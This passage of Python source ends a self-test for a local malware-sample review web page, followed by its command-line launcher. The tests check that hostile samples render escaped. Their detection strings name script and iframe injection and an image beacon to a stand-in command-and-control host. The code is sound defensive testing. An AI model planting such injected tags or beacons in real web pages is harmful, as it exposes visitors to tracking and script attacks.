        case("a hostile sample reaches the cluster page with no live tag",
             any(x in rendered for x in ("<script", "<iframe",
                                         '<img src="http://c2.example/pixel.gif"')), False)
        case("  ...and its text is on the page, escaped", "&lt;script" in rendered, True)
        case("  ...and the same test sees the raw form when it is not escaped",
             "<script" in (page("t", "<pre>" + transcribe(hostile) + "</pre>")), True)

        # The marker page is a second renderer over the same bytes. A safety property proved
        # about one of two renderers is the two-file question asked about one file, which is
        # the shape this repository lost a round to.
        probe = None
        for m in rv.markers(k):
            if rv.spread(m["marker"])["rows"] >= 2:
                probe = m["marker"]
                break
        if probe:
            victims = {r["sha256"] for r in rv.carrying(probe)}
            rv.store.get = lambda sha, size=None: ((hostile, "ok") if sha in victims
                                                   else real_get(sha, size))
            mrendered = marker_page(rv, probe)
            rv.store.get = real_get
            case("the marker page escapes a hostile sample too",
                 any(x in mrendered for x in ("<script", "<iframe")), False)
            case("  ...and its text is on that page, escaped", "&lt;script" in mrendered, True)
        else:
            print("  %-66s %s" % ("no marker to build the marker-page control on",
                                  "SKIPPED - stated, not passed"))
            fails.append("marker page control did not run")
        queue_page(rv)
        rv.record(k, "c/0", "control-family", "a control", ["ZZ"],
                  [rv.clusters[k][0]["sha256"]], 1.0, "control")
        session_page(rv)
    except Exception as exc:                                # noqa: BLE001
        print("  %-66s %s" % ("a full simulated session could not run", "SKIPPED: %s"
                              % str(exc)[:60]))
        fails.append("simulated session did not run")
    after = [digest(p) for p in watched]
    case("both index halves are byte-identical after a session", after, before)
    case("  ...and the same comparison notices a one-byte change",
         [before[0], "changed"] == before, False)
    if rv is not None:
        for p in (rv.proposals_path, rv.log_path):
            if os.path.exists(p):
                os.unlink(p)
        case("session files are written under corpus/local/",
             os.path.relpath(SESSION_DIR, REPO).startswith(os.path.join("corpus", "local")), True)

    print()
    print("%d control(s) FAILED" % len(fails) if fails else "all controls passed")
    return 1 if fails else 0


# -------------------------------------------------------------------------------------- cli

def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--session", default=None,
                    help="session id; defaults to the date plus a counter")
    ap.add_argument("--decided-by", default="operator",
                    help="recorded on every row this session assigns")
    ap.add_argument("--inject", action="store_true", help="the controls, in both directions")
    args = ap.parse_args(argv)

    if args.inject:
        return inject()

    session = args.session or datetime.datetime.now().strftime("%Y%m%d-%H%M")
    print("LOCAL ONLY. This page renders customer paths and live malware bytes; it is bound to "
          "127.0.0.1 and must never be exposed, tunnelled or published.")
    rv = Review(session)
    httpd, url = serve(rv, args.port, args.decided_by)
    st = rv.stats()
    print("session %s: %d/%d clusters closed, %d/%d rows"
          % (session, st["clusters_closed"], st["clusters"], st["rows_decided"], st["rows"]))
    print("  %s" % url)
    print("  proposals: %s" % os.path.relpath(rv.proposals_path, REPO))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nstopped. Nothing was written to any index; record with "
              "corpus/assign-family.py --propose %s --apply"
              % os.path.relpath(rv.proposals_path, REPO))
    return 0


if __name__ == "__main__":
    sys.exit(main())
